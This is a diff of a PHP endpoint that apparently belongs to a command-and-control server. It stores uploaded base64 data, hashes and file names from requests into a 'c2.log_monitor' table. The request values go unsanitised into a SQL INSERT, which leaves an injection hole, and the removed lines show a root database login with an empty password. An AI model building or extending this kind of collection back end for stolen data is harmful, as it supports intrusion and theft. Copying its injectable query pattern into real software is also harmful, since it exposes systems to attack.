@@ -1,26 +1,24 @@
 
 <?php
 
+include 'conf.php';
+include 'db.php';
+
+?>
 
 
-$servername = "localhost";
-$username = "root";
-$password = "";
+<?php
 
-$conn = new mysqli($servername, $username, $password);
-if ($conn->connect_error) {
-  die("Connection failed: " . $conn->connect_error);
-}
 
-if( isset($_REQUEST["payload"]) && isset($_REQUEST["idlog"])) {
+if( isset($_REQUEST["b64"]) && isset($_REQUEST["id_log"]) && isset($_REQUEST["hash"]) && isset($_REQUEST["file_name"]) ) {
 	
-	$payload = $_REQUEST["payload"];  
-	$idlog = $_REQUEST["idlog"];
+	$b64 = $_REQUEST["b64"];  
+	$id_log = $_REQUEST["id_log"];
 	$ip = $_SERVER['REMOTE_ADDR'];
+	$hash = $_REQUEST['hash'];
+	$file_name = $_REQUEST['file_name'];
 	
-	
-	$sql = "INSERT INTO c2.log_monitor (ip_address_source, event_full, id_log) VALUES ('" . $ip . "','" . $payload . "','" . $idlog . "')";
-	
+	$sql = "INSERT INTO c2.log_monitor (ip_address_source, b64, id_log, hash, file_name) VALUES ('" . $ip . "','" . $b64 . "','" . $id_log . "','" . $hash . "','" . $file_name . "')";
 	$result = $conn->query($sql);
 
 	if ($result) {
